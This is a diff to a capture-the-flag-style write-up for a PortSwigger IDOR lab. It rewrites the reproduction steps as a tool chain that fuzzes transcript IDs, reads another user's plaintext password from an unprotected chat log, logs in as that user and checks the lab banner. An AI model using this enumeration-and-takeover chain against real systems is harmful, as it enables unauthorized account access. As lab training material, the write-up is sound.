@@ -166,14 +166,24 @@ success criterion.
 - Chat is websocket-only, so the transcript was obtained by direct file probe instead of
   "chat then click View transcript" — same object, same missing authorization.
 
-## Reproduce
+## Reproduce (standing pieces)
 
-1. `lab_http` script as above (headers `name`/`description`/`version`/`args`/`keywords`,
-   cargo deps `ureq = "2"`, `url = "2"`).
-2. Launch as in steps 1-2 (needs a valid PortSwigger session cookie set).
-3. `lab_http get <instance>/download-transcript/1.txt` -> read the password.
-4. GET `/login` for the csrf token, POST `/login` with `carlos` + that password.
-5. `lab_http get <instance>/` and grep for `Congratulations, you solved the lab!`.
+The chain below is the canonical path; the bespoke `lab_http` script is no longer needed —
+the bundled pieces cover every step.
+
+1. `page_read <lab-page-url>` -> `lab_id`; seed the jar (`cp /tmp/cj1.json <jar>`, the live
+   `portswigger.net` `.AspNetCore.CookiesC1/C2` app session — auth0 cookies are expired).
+2. `range_launch launch <lab_id> --jar <jar>` -> live instance URL.
+3. `objref_scan <instance>/download-transcript/FUZZ.txt --ids 1-6 --jar <jar>` -> id 1 is the
+   only hit (200, 520B; ids 2-6 return 400 `"No transcript"`); its body is `carlos`'s chat log
+   with the plaintext password in the line `You: Ok so my password is <pw>. Is that right?`.
+   The chat widget is websocket-only and a login is **not** required to read the transcript:
+   the object reference itself is the missing authorization.
+4. `http_session get <instance>/login` for a fresh `csrf`, then
+   `http_session post <instance>/login --form csrf=.. --form username=carlos --form password=<pw> --follow`
+   -> `302 /my-account?id=carlos`, page shows `Your username is: carlos`.
+5. `banner_verdict <instance>/ --jar <jar>` -> `solved: true`,
+   `congrats_line: <h4>Congratulations, you solved the lab!</h4>`.
 
 Notes on artifacts intentionally NOT used: the parallel truth repo, the knowledge/seed
 notes, the pre-fetched `/tmp/labpage.html`, and the prior campaign download
